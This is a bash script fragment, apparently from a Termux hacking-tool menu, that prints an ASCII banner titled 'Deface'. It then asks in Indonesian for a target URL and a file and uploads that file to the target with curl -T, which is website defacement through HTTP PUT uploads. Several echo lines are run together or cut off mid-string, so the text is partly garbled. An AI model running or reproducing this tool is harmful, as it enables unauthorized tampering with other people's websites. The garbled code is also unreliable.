if [ $apaan = "A" ] || [ $apaan = "a" ]
then
echo $white"      NO!"$red"                          MNO!   "                 echo $white"     MNO!!"$red"         [AMR]"$red"          MNNOO!    "         echo $white"   MMNO!"$red"                           MNNOO!! "                echo $white"  MNOONNOO!"$red"   MMMMMMMMMM"$white"PPPOII!"$red"   MNNO!!!!  "
echo $white" !O! NNO!"$red" MMMMMMMMMMMMM"$white"PPPOOOII!!"$red" NO!       "
echo $red"       ! MMMMMMMMMMMMM"$white"PPPPOOOOIII! !       "
echo $red"        MMMMMMMMMMMM"$white"PPPPPOOOOOOII!!       "
echo $red"        MMMMMOOOOOO"$white"PPPPPPPPOOOOMII!       "
echo $red"        MMMMM..    OPP"$white"MMP    .,OMI!       "
echo $red"        MMMM::"$purple"   o.,"$red"OP"$white"MP"$purple",.o"$white">echo $red"          NNM:::.,,OOPM!P"$white",.::::!!         "
echo $red"         MMNNNNNOOOOPMO"$white"!!IIPPO!!O!        "
echo $red"         MMMMMNNNNOO"$white":!!:!!IPPPPOO!        "
echo $red"          MMMMMNNOOMMNN"$white"IIIPPPOO!!         "                 echo $red"             MMMONNMMNNN"$white"IIIOO!                "
echo $white"           MN"$red" MOMMMNNN"$white"IIIIIO!"$red" OO          "
echo $white"          MNO! "$red"iiiiii"$white"iiiiiI"$red" OOOO         "    echo $white"     NNN.MNO!   "$red"O"$yellow"!!!!!!!!!"$white"O"$red"   OONO N>
echo $white"    MNNNNNO!    "$red"OOOOO"$white"OOOOOO"$red"    MMNNON!    "   echo $white"      MNNNNO!    "$red"PPP"$white"PPPPPP"$red"    MMNON!      "
echo $white"         OO!"$red"                   ON!        "
echo "                                          "
figlet -f shadow Deface
echo $green "Masukan Target !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ "  target
echo $green "Masukan Script !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ "  script
curl -T /storage/emulated/0/$script $target
echo $red "[+]>>>>> = $target/$script "
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white">
read -p "[B/Q] : " back
fi